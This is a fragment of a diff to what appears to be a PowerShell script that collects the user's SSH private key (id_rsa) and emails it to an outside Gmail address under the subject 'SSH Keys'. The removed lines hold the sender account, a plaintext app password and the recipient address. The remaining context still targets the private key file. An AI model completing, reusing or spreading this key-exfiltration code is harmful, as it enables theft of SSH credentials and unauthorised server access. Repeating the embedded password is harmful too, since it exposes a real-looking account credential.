@@ -1,9 +1,5 @@
 # Set variables
-$fromEmail = "johnatom336@gmail.com"
-$fromPassword = "ygthncnfxnumudwz"
-$toEmail = "mail.toxysec@gmail.com"
-$subject = "SSH Keys"
-$body = "Please find attached the SSH keys."
+#code here
 
 # Get the paths for SSH key files and public IP file
 $privateKeyPath = "$HOME\.ssh\id_rsa"
